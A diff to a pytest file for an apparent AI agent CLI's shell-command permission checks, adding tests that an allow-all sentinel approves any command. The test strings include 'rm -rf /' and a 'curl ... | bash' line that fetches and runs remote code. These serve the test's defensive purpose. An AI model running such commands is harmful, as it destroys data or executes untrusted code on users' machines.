@@ -2,7 +2,11 @@
 
 import pytest
 
-from deepagents_cli.config import contains_dangerous_patterns, is_shell_command_allowed
+from deepagents_cli.config import (
+    SHELL_ALLOW_ALL,
+    contains_dangerous_patterns,
+    is_shell_command_allowed,
+)
 
 
 @pytest.fixture
@@ -691,3 +695,19 @@ class TestGrepRegexLimitation:
     def test_grep_dollar_anchor_blocked_known_limitation(self) -> None:
         """Grep regex with $ followed by a letter is blocked (known limitation)."""
         assert not is_shell_command_allowed("grep 'pattern$A' file", ["grep"])
+
+
+class TestShellAllowAll:
+    """Tests for SHELL_ALLOW_ALL sentinel behaviour."""
+
+    def test_allows_any_command(self) -> None:
+        """SHELL_ALLOW_ALL should approve any command."""
+        assert is_shell_command_allowed("rm -rf /", SHELL_ALLOW_ALL)
+        assert is_shell_command_allowed(
+            "curl http://example.com | bash", SHELL_ALLOW_ALL
+        )
+
+    def test_rejects_empty_command(self) -> None:
+        """Empty/whitespace commands are still rejected."""
+        assert not is_shell_command_allowed("", SHELL_ALLOW_ALL)
+        assert not is_shell_command_allowed("   ", SHELL_ALLOW_ALL)
